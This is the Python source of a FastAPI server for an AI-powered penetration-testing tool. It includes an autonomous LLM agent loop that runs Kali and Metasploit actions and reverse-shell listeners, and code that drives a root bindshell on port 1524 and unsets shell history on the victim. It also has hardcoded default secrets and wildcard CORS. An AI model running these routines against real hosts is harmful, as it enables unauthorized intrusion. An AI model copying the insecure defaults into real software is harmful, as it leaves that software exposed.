#!/usr/bin/env python3
"""
PenTool - main.py
FastAPI server for PenTool with JWT auth and live scan views.
"""

import os
import re
import threading
import uuid
import base64
import shlex
import subprocess
import queue
import time
import json
import socket
from datetime import datetime
from pathlib import Path
from typing import Any, Dict, Optional

from fastapi import FastAPI, HTTPException, Request, Security
from fastapi.middleware.cors import CORSMiddleware
from fastapi.security import HTTPBearer
from fastapi.security.api_key import APIKeyHeader
from fastapi.staticfiles import StaticFiles
from pydantic import BaseModel, Field

from auth import create_jwt_token, verify_api_key
from db import (
    add_scan_event,
    create_scan_run,
    create_session,
    delete_full_session,
    get_all_exploits as db_get_all_exploits,
    get_all_history,
    get_all_fixes,
    get_scan_status,
    get_scan_run,
    get_scan_run_by_sl_no,
    get_scan_sudo_password,
    get_session,
    get_scheduled_scan,
    get_exploit_artifact,
    get_vulnerability,
    get_vulnerabilities,
    get_connection,
    get_enabled_scheduled_scans,
    init_db,
    list_exploit_artifacts,
    list_audit_logs,
    list_scan_events,
    list_scan_results,
    list_scheduled_scans,
    save_audit_log,
    save_exploit_artifact,
    save_exploit,
    save_fix,
    save_scheduled_scan,
    save_summary,
    save_vulnerability,
    update_scheduled_scan_status,
    update_scan_run,
    delete_scheduled_scan,
    delete_exploit_artifact,
    update_exploit_artifact,
)
from exploit_utils import escalate_privileges, execute_exploit, generate_exploit
from export import export_html, export_pdf
from llm import analyse_target, ask_lm_studio
from llm_config import (
    get_provider_presets,
    list_available_models,
    load_llm_config,
    normalize_llm_config,
    probe_llm_connection,
    public_llm_config,
    save_llm_config,
)
from msf_utils import Metasploit, start_msfrpcd
from search import fetch_page, handle_search_dispatch
from tools import (
    format_recon_for_llm,
    get_tool_inventory,
    is_blocked_command,
    run_default_recon,
    run_tool_by_command,
)
import ssh_utils
import users as user_mgr
from cve_engine import auto_exploit_pipeline, generate_exploit_code, detect_cves, save_payload_to_db
from agent_v2 import AgentSession, run_autonomous_scan
from victim_explorer import VictimExplorer, EXPLORER_WORKSPACE


SECRET_KEY = os.getenv("JWT_SECRET", "pentool-secret-key")
ALGORITHM = "HS256"
API_KEY_NAME = "X-API-KEY"
API_KEY = os.getenv("API_KEY", "pentool-api-key")
LEGACY_API_KEYS = {f"{'meta'}{'tron'}-api-key"}

api_key_header = APIKeyHeader(name=API_KEY_NAME, auto_error=False)
security = HTTPBearer()

app = FastAPI(title="PenTool", description="AI-Powered Penetration Testing")


@app.middleware("http")
async def no_cache_frontend_assets(request: Request, call_next):
    response = await call_next(request)
    if request.url.path == "/" or request.url.path.startswith("/static/"):
        response.headers["Cache-Control"] = "no-store, no-cache, must-revalidate, max-age=0"
        response.headers["Pragma"] = "no-cache"
        response.headers["Expires"] = "0"
    return response

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

frontend_path = os.path.join(os.path.dirname(__file__), "frontend")
if os.path.exists(frontend_path):
    app.mount("/static", StaticFiles(directory=frontend_path), name="static")
reports_path = os.path.join(os.path.dirname(__file__), "reports")
os.makedirs(reports_path, exist_ok=True)
app.mount("/reports", StaticFiles(directory=reports_path), name="reports")
exploit_workspace = Path(os.path.dirname(__file__)) / "generated_exploits"
exploit_workspace.mkdir(exist_ok=True)
background_processes = {}
terminal_shells = {}
custom_sessions = {}


class ScanRequest(BaseModel):
    target: str
    scan_id: Optional[str] = None
    user: Optional[str] = None
    password: Optional[str] = None
    sudo_password: Optional[str] = None
    scan_type: str = "standard"
    intensity: str = "medium"
    options: Dict[str, Any] = Field(default_factory=dict)


class ExploitRequest(BaseModel):
    target: str
    user: str
    password: str
    exploit: Optional[str] = None
    scan_id: Optional[str] = None


class VulnerabilityExploitRequest(BaseModel):
    scan_id: Optional[str] = None
    user: Optional[str] = None
    password: Optional[str] = None
    attacker_ip: Optional[str] = None


class ExploitArtifactRequest(BaseModel):
    target: str
    scan_id: Optional[str] = None
    sl_no: Optional[int] = None
    vuln_id: Optional[int] = None
    title: Optional[str] = ""
    cve: Optional[str] = ""
    language: Optional[str] = "python"
    filename: Optional[str] = ""
    code: str
    notes: Optional[str] = ""
    status: Optional[str] = "draft"


class ExploitArtifactUpdateRequest(BaseModel):
    title: Optional[str] = None
    cve: Optional[str] = None
    language: Optional[str] = None
    filename: Optional[str] = None
    code: Optional[str] = None
    notes: Optional[str] = None
    status: Optional[str] = None


class ExploitAiRequest(BaseModel):
    target: str
    prompt: str
    scan_id: Optional[str] = None
    sl_no: Optional[int] = None
    vuln_id: Optional[int] = None
    artifact_id: Optional[int] = None
    cve: Optional[str] = ""
    language: Optional[str] = "python"


class ExploitRunRequest(BaseModel):
    args: Optional[str] = ""


class ScheduleRequest(BaseModel):
    target: str
    scan_type: Optional[str] = 'standard'
    intensity: Optional[str] = 'medium'
    options: Optional[dict] = {}
    schedule_at: str
    enabled: bool = True


class SSHRequest(BaseModel):
    target: str
    user: str
    password: str
    command: str


class TerminalRequest(BaseModel):
    session_id: Optional[int] = None
    command: str


class TerminalAnalysisRequest(BaseModel):
    output: str
    command: Optional[str] = None
    session_id: Optional[int] = None


class TerminalChatRequest(BaseModel):
    prompt: str
    session_id: Optional[int] = None


class ReportRequest(BaseModel):
    sl_no: int
    format: str
    include_exploitation: bool = True
    include_commands: bool = True


class TokenRequest(BaseModel):
    api_key: str


class MSFRequest(BaseModel):
    target: str
    user: str
    password: str
    module: str
    options: Optional[dict] = {}
    session_id: Optional[int] = None
    scan_id: Optional[str] = None


class LLMConfigRequest(BaseModel):
    provider: str
    api_base: str
    api_key: Optional[str] = ""
    model: str
    attacker_ip: Optional[str] = ""
    temperature: float = 0.7
    top_p: float = 0.9
    max_tokens: int = 8192
    timeout: int = 120
    api_key_header: Optional[str] = "Authorization"
    api_key_prefix: Optional[str] = "Bearer"
    chat_path: Optional[str] = "/chat/completions"
    models_path: Optional[str] = "/models"
    extra_headers: Dict[str, Any] = Field(default_factory=dict)
    extra_body: Dict[str, Any] = Field(default_factory=dict)
    clear_api_key: bool = False
    clear_extra_headers: bool = False


def generate_scan_id() -> str:
    return str(uuid.uuid4())[:8]


class ScanPaused(Exception):
    pass


def ensure_scan_not_paused(scan_id: str):
    if get_scan_status(scan_id) == "paused":
        raise ScanPaused("Scan paused by user")


def persist_command_output(scan_id: str, command: str, output: str, target: str):
    conn = get_connection()
    c = conn.cursor()
    c.execute(
        "INSERT INTO scan_results (scan_id, command, output, target, timestamp) VALUES (?, ?, ?, ?, ?)",
        (scan_id, command, output, target, datetime.now().strftime("%Y-%m-%d %H:%M:%S")),
    )
    conn.commit()
    conn.close()


def audit_event(actor: str, event_type: str, details: str, scan_id: str = None, vuln_id: int = None, schedule_id: int = None):
    save_audit_log(actor, event_type, details, scan_id=scan_id, vuln_id=vuln_id, schedule_id=schedule_id)


def output_contains_root(output: str) -> bool:
    if not output:
        return False
    root_patterns = [
        r"\buid=0\(root\)",
        r"^root$",
        r"^whoami\s*[:\-]?\s*root$",
        r"\broot@[\w\-]+[:#]",
    ]
    for pattern in root_patterns:
        if re.search(pattern, output, re.IGNORECASE | re.MULTILINE):
            return True
    return False


def schedule_monitor():
    while True:
        try:
            now = datetime.now()
            schedules = get_enabled_scheduled_scans()
            for row in schedules:
                schedule_id, target, scan_type, intensity, options_json, schedule_at = row
                try:
                    scheduled_time = datetime.fromisoformat(schedule_at)
                except ValueError:
                    continue
                if scheduled_time <= now:
                    actor = "system"
                    audit_event(actor, "schedule_triggered", f"Triggering scheduled scan {schedule_id} for {target}", schedule_id=schedule_id)
                    schedule_options = json.loads(options_json or "{}") if options_json else {}
                    scan_id = generate_scan_id()
                    create_scan_run(scan_id, target, status="running", phase="recon")
                    add_scan_event(scan_id, "status", "Scheduled scan started", f"Target: {target}", "recon")
                    start_scan_thread(
                        target,
                        scan_id,
                        scan_type=scan_type,
                        intensity=intensity,
                        options=schedule_options,
                    )
                    update_scheduled_scan_status(schedule_id, status="triggered", enabled=False, last_run_at=now.strftime("%Y-%m-%d %H:%M:%S"))
            time.sleep(30)
        except Exception as exc:
            print(f"Schedule monitor error: {exc}")
            time.sleep(30)


def parse_agent_action(response: str) -> dict:
    action = {"type": "STOP", "command": "", "query": "", "url": "", "path": "", "content_b64": "", "reason": ""}
    action_match = re.search(r"^ACTION:\s*(LOCAL|SESSION|SEARCH|FETCH|WRITE_FILE|LISTENER_START|LISTENER_STOP|STOP)\s*$", response, re.IGNORECASE | re.MULTILINE)
    command_match = re.search(r"^COMMAND:\s*(.+)$", response, re.IGNORECASE | re.MULTILINE)
    query_match = re.search(r"^QUERY:\s*(.+)$", response, re.IGNORECASE | re.MULTILINE)
    url_match = re.search(r"^URL:\s*(.+)$", response, re.IGNORECASE | re.MULTILINE)
    path_match = re.search(r"^PATH:\s*(.+)$", response, re.IGNORECASE | re.MULTILINE)
    content_match = re.search(r"^CONTENT_B64:\s*([A-Za-z0-9+/=]+)\s*$", response, re.IGNORECASE | re.MULTILINE)
    reason_match = re.search(r"^REASON:\s*(.+)$", response, re.IGNORECASE | re.MULTILINE)

    if action_match:
        action["type"] = action_match.group(1).upper()
    if command_match:
        action["command"] = command_match.group(1).strip()
    if query_match:
        action["query"] = query_match.group(1).strip()
    if url_match:
        action["url"] = url_match.group(1).strip()
    if path_match:
        action["path"] = path_match.group(1).strip()
    if content_match:
        action["content_b64"] = content_match.group(1).strip()
    if reason_match:
        action["reason"] = reason_match.group(1).strip()
    return action


def write_generated_exploit(relative_path: str, content_b64: str) -> str:
    if not relative_path:
        return "[!] Missing PATH for WRITE_FILE."
    if os.path.isabs(relative_path) or ".." in Path(relative_path).parts:
        return "[!] Invalid PATH. Use a relative path inside generated_exploits."

    target_path = (exploit_workspace / relative_path).resolve()
    if exploit_workspace.resolve() not in target_path.parents and target_path != exploit_workspace.resolve():
        return "[!] Invalid PATH. Refusing to write outside generated_exploits."

    try:
        content = base64.b64decode(content_b64.encode("ascii"), validate=True)
    except Exception as exc:
        return f"[!] Invalid CONTENT_B64: {exc}"

    target_path.parent.mkdir(parents=True, exist_ok=True)
    target_path.write_bytes(content)
    return f"[+] Wrote {len(content)} bytes to {target_path}"


def start_background_command(scan_id: str, command: str) -> str:
    if not command:
        return "[!] LISTENER_START requires COMMAND."
    if is_blocked_command(command):
        return "[!] Command blocked by safety policy."
    try:
        parts = shlex.split(command)
    except ValueError as exc:
        return f"[!] Could not parse command: {exc}"
    if not parts:
        return "[!] Empty command."

    proc = subprocess.Popen(parts, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    key = f"{scan_id}:{len(background_processes) + 1}"
    background_processes[key] = {"process": proc, "command": command}
    return f"[+] Started background process {key} pid={proc.pid}: {command}"


def stop_background_command(process_key: str = "") -> str:
    if not process_key:
        keys = list(background_processes.keys())
    else:
        keys = [process_key]
    if not keys:
        return "[!] No background processes to stop."

    outputs = []
    for key in keys:
        item = background_processes.pop(key, None)
        if not item:
            outputs.append(f"[!] Unknown background process: {key}")
            continue
        proc = item["process"]
        proc.terminate()
        try:
            stdout, stderr = proc.communicate(timeout=5)
        except subprocess.TimeoutExpired:
            proc.kill()
            stdout, stderr = proc.communicate(timeout=5)
        outputs.append(f"[+] Stopped {key}: {item['command']}\nSTDOUT:\n{stdout[:1000]}\nSTDERR:\n{stderr[:1000]}")
    return "\n\n".join(outputs)


def run_ai_action_loop(target: str, scan_id: str, analysis: dict, raw_scan: str = "", msf: Optional[Metasploit] = None, session_id: Optional[int] = None, max_steps: int = 16):
    update_scan_run(scan_id, phase="ai_actions", session_id=session_id)
    add_scan_event(scan_id, "status", "Iniciando bucle IA de acciones", "La IA propondra acciones de enumeracion/validacion. PenTool ejecutara solo comandos no interactivos y devolvera la salida.", "ai_actions")

    transcript = [
        f"Target: {target}",
        f"Risk: {analysis.get('risk_level', 'UNKNOWN')}",
        f"Summary: {analysis.get('summary', '')}",
        f"Victim session available: {'YES, use ACTION: SESSION for commands inside the VM' if session_id else 'NO, you are on Kali only; use ACTION: LOCAL with non-interactive tools until a session is obtained'}",
        "Important operator guidance:",
        "- sqlmap is for HTTP/database connection strings with supported options; do not use sqlmap directly as 'sqlmap --host TARGET --port 3306'.",
        "- If sqlmap says no parameters were found, enumerate URLs/forms first with curl/nikto/gobuster/crawl, or rerun sqlmap only with a real parameterized URL or request file.",
        "- For direct MySQL exposure use nmap mysql scripts, mysql client with explicit credentials, or SEARCH for version-specific CVEs.",
        "- If no verified exploit path exists, continue enumeration and stop with a clear conclusion instead of inventing a payload.",
        "- If a web tool reports wildcard responses, adapt the next command using the provided status code or response length, for example gobuster --exclude-length LENGTH.",
        "High-signal recon facts:",
        raw_scan[:8000],
        "Metasploitable-style quick wins to recognize:",
        "- 1524/tcp open bindshell means a root shell may already be exposed. Test with a non-interactive command like: bash -lc \"printf 'id\\nuname -a\\nexit\\n' | timeout 10 nc TARGET 1524\".",
        "- vsftpd 2.3.4 can be tested with Metasploit module unix/ftp/vsftpd_234_backdoor or a scripted trigger, then connect to the spawned shell if present.",
        "- UnrealIRCd 3.2.8.1 often maps to unix/irc/unreal_ircd_3281_backdoor.",
        "- Samba 3.0.20-Debian often maps to multi/samba/usermap_script.",
        "- DistCC on 3632, if present, often maps to unix/misc/distcc_exec.",
        "Context-only exploit suggestions, not commands:",
        "\n".join(
            f"- {exp.get('exploit_name')} | tool={exp.get('tool_used')} | payload={exp.get('payload')} | notes={exp.get('notes')}"
            for exp in analysis.get("exploits", [])
        ) or "- none",
    ]

    system_prompt = """You are PenTool's autonomous pentest operator in an authorized lab.
Choose exactly one next action based on the transcript.

Allowed ACTION values:
- LOCAL: run one local Kali command/tool against the target.
- SESSION: run one command inside the victim through an existing Meterpreter/session shell.
- SEARCH: search the internet for CVE/exploit/module details.
- FETCH: fetch and extract text from one URL found during research.
- WRITE_FILE: create a PoC/script inside generated_exploits using base64 content.
- LISTENER_START: start a long-running local listener/background tool such as nc -lvnp PORT.
- LISTENER_STOP: stop one or all background listeners and collect output.
- STOP: stop when no useful next command remains.

Rules:
- Return only one action in this format:
ACTION: LOCAL|SESSION|SEARCH|FETCH|WRITE_FILE|LISTENER_START|LISTENER_STOP|STOP
COMMAND: exact command for LOCAL/SESSION, or empty
QUERY: search query for SEARCH, or empty
URL: URL for FETCH, or empty
PATH: relative file path for WRITE_FILE, or empty
CONTENT_B64: base64 file content for WRITE_FILE, or empty
REASON: short reason
- LOCAL can use any installed Kali tool, including searchsploit, msfconsole, nmap, curl, nikto, ftp, mysql, psql, smbclient, enum4linux, hydra, gobuster, sqlmap, nc, telnet, python scripts in generated_exploits, etc.
- If recon shows 1524/tcp open bindshell, prioritize validating it before slower web/database paths. Use a non-interactive nc pipeline, not a raw nc shell.
- If a CVE has no local verified exploit/payload, use SEARCH/FETCH to research it. Do not generate a reverse shell payload from imagination.
- Do not treat an exploit suggestion as proof. Search or enumerate to confirm it first.
- LOCAL commands run on Kali, not inside the victim VM. They must be non-interactive and finish by themselves.
- Never use raw interactive commands such as "ftp TARGET", "telnet TARGET", "nc TARGET PORT", "mysql -h TARGET", "ssh TARGET", or "msfconsole" without -x/-r/exit.
- For FTP anonymous checks prefer curl ftp://anonymous:@TARGET/ or a scripted bash -lc pipeline with timeout.
- For direct MySQL checks prefer: nmap -p3306 --script mysql-info,mysql-empty-password TARGET, or mysql --connect-timeout=10 -h TARGET -u USER -pPASS -e 'SHOW DATABASES;'.
- Do not use sqlmap against a raw host/port. sqlmap needs -u with injectable HTTP parameters, -r request file, or -d database URI.
- If a command fails because the tool syntax is invalid, do not retry the same syntax family; SEARCH/FETCH documentation or switch tools.
- If gobuster says the server returns wildcard status/length for random paths, retry once with --exclude-length using the reported Length value, or switch to nikto/curl/manual endpoint fingerprinting.
- If the target is a router or appliance, prioritize fingerprinting, default admin surface discovery, firmware/banner collection, TLS/header checks, and known CVE research by exact model/version. Do not infer database services that are not visible.
- If no exploitable evidence appears after several useful checks, ACTION: STOP with the reason "sin ruta de explotacion confirmada".
- If SEARCH results are too broad/irrelevant, try searchsploit locally and targeted queries with exact service/version/CVE.
- For long scans avoid full port sweeps unless needed; prefer targeted ports from recon and include timing/timeout options.
- Use ACTION: SESSION only when the transcript says a victim session is available.
- For SESSION, use Linux enumeration/post-exploitation commands suitable for the victim shell.
- Use LISTENER_START for reverse-shell listeners that must remain open. Do not use LOCAL for raw listeners because they block.
- Do not propose destructive commands, persistence, data deletion, shutdown, reboot, formatting, wiping, or commands outside the authorized lab target."""

    for step in range(1, max_steps + 1):
        ensure_scan_not_paused(scan_id)
        ai_response = ask_lm_studio([
            {"role": "system", "content": system_prompt},
            {"role": "user", "content": "\n\n".join(transcript[-12:])},
        ])
        action = parse_agent_action(ai_response)
        add_scan_event(
            scan_id,
            "ai_action",
            f"IA paso {step}: {action['type']}",
            f"Command: {action['command']}\nQuery: {action['query']}\nURL: {action['url']}\nPath: {action['path']}\nReason: {action['reason']}\n\nRaw:\n{ai_response}",
            "ai_actions",
        )

        if action["type"] == "STOP":
            add_scan_event(scan_id, "ai_stop", "IA detuvo el bucle de acciones", action["reason"], "ai_actions")
            break

        if action["type"] == "SEARCH":
            if not action["query"]:
                output = "[!] SEARCH requires QUERY."
            else:
                output = handle_search_dispatch(action["query"])
        elif action["type"] == "FETCH":
            if not action["url"]:
                output = "[!] FETCH requires URL."
            else:
                output = fetch_page(action["url"], max_chars=6000)
        elif action["type"] == "WRITE_FILE":
            output = write_generated_exploit(action["path"], action["content_b64"])
        elif action["type"] == "LISTENER_START":
            output = start_background_command(scan_id, action["command"])
        elif action["type"] == "LISTENER_STOP":
            output = stop_background_command(action["command"])
        elif not action["command"]:
            transcript.append(f"Step {step}: invalid empty command. Output: no command was executed.")
            continue
        elif is_blocked_command(action["command"]):
            output = "[!] Command blocked by safety policy."
        elif action["type"] == "SESSION":
            if not msf or not session_id:
                output = "[!] No active victim session is available. Choose ACTION: LOCAL until a session exists."
            else:
                output = msf.session_interact(session_id, action["command"])
                persist_command_output(scan_id, f"session:{session_id}$ {action['command']}", output, target)
        else:
            output = run_tool_by_command(action["command"], scan_id=scan_id, target=target)

        if output_contains_root(output):
            add_scan_event(scan_id, "root_detected", "Root detectado durante bucle IA", output[:1200], "ai_actions")
            update_scan_run(scan_id, status="completed", phase="completed")
            add_scan_event(scan_id, "status", "Escaneo completado", "Root detectado durante las acciones de IA. Se detiene el bucle de explotación.", "completed")
            return

        label = action["command"] or action["query"] or action["url"] or action["path"] or action["type"]
        add_scan_event(scan_id, "ai_action_output", f"Salida paso {step}: {label}", output[:1200], "ai_actions" if action["type"] != "SESSION" else "post_exploitation")
        transcript.append(f"Step {step}\nACTION: {action['type']}\nCOMMAND: {action['command']}\nQUERY: {action['query']}\nURL: {action['url']}\nPATH: {action['path']}\nOUTPUT:\n{output[:5000]}")


def start_scan_thread(
    target: str,
    scan_id: str,
    user: str = None,
    password: str = None,
    sudo_password: str = None,
    scan_type: str = "standard",
    intensity: str = "medium",
    options: Optional[Dict[str, Any]] = None,
):
    def worker():
        try:
            run_full_analysis(
                target,
                scan_id,
                user,
                password,
                sudo_password,
                scan_type,
                intensity,
                options or {},
            )
        except ScanPaused:
            pass
        except Exception as exc:
            print(f"Error running scan {scan_id}: {exc}")

    threading.Thread(target=worker, daemon=True).start()


def _scan_run_to_dict(row):
    if not row:
        return None
    return {
        "scan_id": row[0],
        "target": row[1],
        "status": row[2],
        "phase": row[3],
        "started_at": row[4],
        "updated_at": row[5],
        "completed_at": row[6],
        "sl_no": row[7],
        "risk_level": row[8],
        "summary": row[9],
        "llm_response": row[10],
        "raw_scan": row[11],
        "error": row[12],
        "session_id": row[13] if len(row) > 13 else None,
    }


def _scan_has_bindshell_access(scan_id: str, scan: dict = None, events: list = None) -> bool:
    scan = scan or _scan_run_to_dict(get_scan_run(scan_id))
    if not scan:
        return False
    raw_scan = (scan.get("raw_scan") or "").lower()
    if "1524/tcp" not in raw_scan or "bindshell" not in raw_scan:
        return False
    events = events or [_scan_event_to_dict(event) for event in list_scan_events(scan_id)]
    return any(
        event["event_type"] in {"root_achieved", "root_achieved_final"}
        and ("bindshell" in f"{event.get('title', '')} {event.get('content', '')}".lower()
             or "bind shell" in f"{event.get('title', '')} {event.get('content', '')}".lower())
        for event in events
    )


def run_bindshell_command(target: str, command: str, timeout: int = 20) -> str:
    if not command.strip():
        return "[!] Empty command."
    script = f"printf '%s\\nexit\\n' {shlex.quote(command.strip())} | timeout {int(timeout)} nc {shlex.quote(target)} 1524"
    try:
        result = subprocess.run(["bash", "-lc", script], capture_output=True, text=True, timeout=timeout + 5)
        output = result.stdout.strip()
        errors = result.stderr.strip()
        if output and errors:
            return output + "\n[STDERR]\n" + errors
        return output or errors or "[!] Command returned no output."
    except subprocess.TimeoutExpired:
        return f"[!] Timed out after {timeout}s running command through bindshell."
    except FileNotFoundError:
        return "[!] bash/nc/timeout not available locally; cannot use bindshell terminal."
    except Exception as exc:
        return f"[!] Error running bindshell command: {exc}"


class PersistentBindShell:
    def __init__(self, target: str):
        self.target = target
        self.lock = threading.Lock()
        self.output_queue = queue.Queue()
        self.process = subprocess.Popen(
            ["bash", "-lc", f"nc {shlex.quote(target)} 1524"],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            bufsize=1,
        )
        self.reader = threading.Thread(target=self._read_output, daemon=True)
        self.reader.start()
        time.sleep(0.4)
        self._drain()
        self.run("export TERM=xterm; unset HISTFILE; cd /; pwd; id", timeout=8)

    def _read_output(self):
        try:
            for line in self.process.stdout:
                self.output_queue.put(line)
        except Exception as exc:
            self.output_queue.put(f"[!] Reader stopped: {exc}\n")

    def _drain(self) -> str:
        chunks = []
        while True:
            try:
                chunks.append(self.output_queue.get_nowait())
            except queue.Empty:
                break
        return "".join(chunks)

    def is_alive(self) -> bool:
        return self.process.poll() is None

    def close(self):
        if self.is_alive() and self.process.stdin:
            try:
                self.process.stdin.write("exit\n")
                self.process.stdin.flush()
            except Exception:
                pass
        if self.is_alive():
            self.process.terminate()

    def run(self, command: str, timeout: int = 25) -> str:
        command = command.strip()
        if not command:
            return "[!] Empty command."
        if not self.is_alive():
            return "[!] Bindshell session is not alive."
        marker = f"__PenTool_DONE_{uuid.uuid4().hex[:10]}__"
        payload = f"{command}\nprintf '\\n{marker}:%s\\n' \"$?\"\n"
        with self.lock:
            self._drain()
            self.process.stdin.write(payload)
            self.process.stdin.flush()
            deadline = time.time() + timeout
            output = ""
            while time.time() < deadline:
                try:
                    output += self.output_queue.get(timeout=0.25)
                except queue.Empty:
                    continue
                if marker in output:
                    break
            else:
                return (output.strip() + f"\n[!] Timed out after {timeout}s waiting for command marker.").strip()
        return clean_bindshell_output(output, marker, command)


class CustomSession:
    """Generic interactive session (revshell, SSH, netcat listener, etc.)."""

    def __init__(self, session_id: str, target: str, session_type: str, command: str = "", info: str = ""):
        self.id = session_id
        self.target = target
        self.type = session_type
        self.command = command
        self.info = info
        self.created = datetime.utcnow().isoformat()
        self.alive = True
        self.process = None
        self.output_queue = queue.Queue()
        self.lock = threading.Lock()
        self.last_output = ""
        self._start()

    def _start(self):
        if not self.command:
            return
        try:
            self.process = subprocess.Popen(
                self.command,
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
                bufsize=1,
                shell=True,
            )
            self.reader = threading.Thread(target=self._read_output, daemon=True)
            self.reader.start()
            time.sleep(0.3)
            self._drain()
        except Exception as e:
            self.last_output = f"[!] Failed to start: {e}"
            self.alive = False

    def _read_output(self):
        try:
            for line in self.process.stdout:
                self.output_queue.put(line)
        except Exception:
            pass

    def _drain(self) -> str:
        chunks = []
        while True:
            try:
                chunks.append(self.output_queue.get_nowait())
            except queue.Empty:
                break
        return "".join(chunks)

    def is_alive(self) -> bool:
        return self.alive and self.process and self.process.poll() is None

    def close(self):
        self.alive = False
        if self.process and self.process.stdin:
            try:
                self.process.stdin.write("exit\n")
                self.process.stdin.flush()
            except Exception:
                pass
        if self.process:
            self.process.terminate()

    def run(self, command: str, timeout: int = 30) -> str:
        if not self.is_alive():
            return "[!] Session is not alive."
        with self.lock:
            self._drain()
            try:
                self.process.stdin.write(command + "\n")
                self.process.stdin.flush()
            except Exception as e:
                return f"[!] Write error: {e}"
            deadline = time.time() + timeout
            output = ""
            while time.time() < deadline:
                try:
                    output += self.output_queue.get(timeout=0.25)
                except queue.Empty:
                    continue
                # Use a simple heuristic: if no new data for 2 seconds, return
                recent = time.time()
                while time.time() - recent < 0.5:
                    try:
                        output += self.output_queue.get(timeout=0.15)
                        recent = time.time()
                    except queue.Empty:
                        break
                break
        self.last_output = output.strip()
        return self.last_output or "[+] Command sent (no output yet)."

    def to_dict(self):
        return {
            "id": self.id,
            "target": self.target,
            "type": self.type,
            "info": self.info,
            "source": self.type,
            "alive": self.is_alive(),
            "created": self.created,
        }


def clean_bindshell_output(output: str, marker: str, command: str) -> str:
    if not output:
        return ""
    lines = output.replace("\r\n", "\n").replace("\r", "\n").splitlines()
    cleaned = []
    command_seen = False
    for line in lines:
        stripped = line.strip()
        if marker in stripped:
            break
        promptless = re.sub(r"^root@[^#]+#\s*", "", line)
        promptless = re.sub(r"^[^$#]+[$#]\s*", "", promptless)
        if not command_seen and promptless.strip() == command.strip():
            command_seen = True
            continue
        if promptless.strip() in {"", "exit"}:
            continue
        cleaned.append(promptless)
    return "\n".join(cleaned).strip() or "[+] Command completed with no output."


def plain_ai_text(text: str) -> str:
    text = str(text or "")
    text = re.sub(r"```(?:\w+)?\n?", "", text)
    text = text.replace("```", "")
    text = re.sub(r"^\s{0,3}#{1,6}\s*", "", text, flags=re.MULTILINE)
    text = re.sub(r"^\s*[-*]\s+", "- ", text, flags=re.MULTILINE)
    text = re.sub(r"\*\*(.*?)\*\*", r"\1", text)
    text = re.sub(r"\*(.*?)\*", r"\1", text)
    text = re.sub(r"`([^`]+)`", r"\1", text)
    return text.strip()


def get_bindshell_session(scan_id: str, target: str) -> PersistentBindShell:
    session = terminal_shells.get(scan_id)
    if session and session.is_alive():
        return session
    session = PersistentBindShell(target)
    terminal_shells[scan_id] = session
    return session


def run_terminal_command(scan_id: str, scan: dict, request: TerminalRequest) -> dict:
    if not request.session_id and _scan_has_bindshell_access(scan_id, scan):
        shell = get_bindshell_session(scan_id, scan["target"])
        output = shell.run(request.command)
        add_scan_event(scan_id, "terminal_command", "Terminal bindshell", f"Comando: {request.command}\n\nSalida:\n{output}", "terminal")
        persist_command_output(scan_id, f"bindshell:1524$ {request.command}", output, scan["target"])
        return {"output": output, "has_root": True, "session_id": None, "access_type": "bindshell"}
    if not request.session_id:
        raise HTTPException(status_code=400, detail="No active terminal session is available")
    sudo_password = get_scan_sudo_password(scan_id)
    msf = Metasploit(sudo_password=sudo_password)
    output = msf.session_interact(request.session_id, request.command)
    add_scan_event(scan_id, "terminal_command", "Terminal Meterpreter", f"Comando: {request.command}\n\nSalida:\n{output}", "terminal")
    persist_command_output(scan_id, f"session:{request.session_id}$ {request.command}", output, scan["target"])
    has_root = msf.check_if_root(request.session_id)
    return {"output": output, "has_root": has_root, "session_id": request.session_id, "access_type": "meterpreter"}


def _scan_event_to_dict(row):
    return {
        "id": row[0],
        "scan_id": row[1],
        "event_type": row[2],
        "phase": row[3],
        "title": row[4],
        "content": row[5],
        "created_at": row[6],
    }


def _scan_result_to_dict(row):
    return {
        "id": row[0],
        "scan_id": row[1],
        "command": row[2],
        "output": row[3],
        "target": row[4],
        "timestamp": row[5],
    }


def _artifact_to_dict(row):
    if not row:
        return None
    return {
        "id": row[0],
        "target": row[1],
        "scan_id": row[2],
        "sl_no": row[3],
        "vuln_id": row[4],
        "title": row[5],
        "cve": row[6],
        "language": row[7],
        "filename": row[8],
        "code": row[9],
        "notes": row[10],
        "status": row[11],
        "created_at": row[12],
        "updated_at": row[13],
        "last_result": row[14],
    }


def safe_exploit_filename(artifact: dict) -> str:
    language = (artifact.get("language") or "text").lower()
    ext = {
        "python": ".py",
        "py": ".py",
        "bash": ".sh",
        "sh": ".sh",
        "ruby": ".rb",
        "perl": ".pl",
        "javascript": ".js",
        "powershell": ".ps1",
        "text": ".txt",
    }.get(language, ".txt")
    filename = artifact.get("filename") or f"exploit_{artifact.get('id')}{ext}"
    filename = re.sub(r"[^A-Za-z0-9_.-]", "_", filename)
    if "." not in filename:
        filename += ext
    return filename


def write_exploit_artifact_file(artifact: dict) -> Path:
    target_dir = (exploit_workspace / re.sub(r"[^A-Za-z0-9_.-]", "_", artifact.get("target") or "unknown")).resolve()
    if exploit_workspace.resolve() not in target_dir.parents and target_dir != exploit_workspace.resolve():
        raise ValueError("Invalid target path")
    target_dir.mkdir(parents=True, exist_ok=True)
    file_path = (target_dir / safe_exploit_filename(artifact)).resolve()
    if target_dir not in file_path.parents and file_path != target_dir:
        raise ValueError("Invalid exploit file path")
    file_path.write_text(artifact.get("code") or "", encoding="utf-8")
    return file_path


def sanitize_python_exploit_file(file_path: Path) -> bool:
    if file_path.suffix.lower() != ".py":
        return False
    text = file_path.read_text(encoding="utf-8")
    if "mysql.connector.connect" not in text and "adaptive=" not in text:
        return False

    sanitized = re.sub(
        r"\badaptive\s*=\s*(?:True|False|[^,\)\n]+)\s*,?",
        "",
        text,
        flags=re.IGNORECASE,
    )
    sanitized = re.sub(r",\s*,", ",", sanitized)
    sanitized = re.sub(r"\(\s*,", "(", sanitized)
    sanitized = re.sub(r",\s*\)", ")", sanitized)

    if sanitized != text:
        file_path.write_text(sanitized, encoding="utf-8")
        return True
    return False


def extract_code_block(text: str) -> str:
    match = re.search(r"```(?:\w+)?\s*(.*?)```", text or "", re.DOTALL)
    return (match.group(1) if match else text or "").strip()


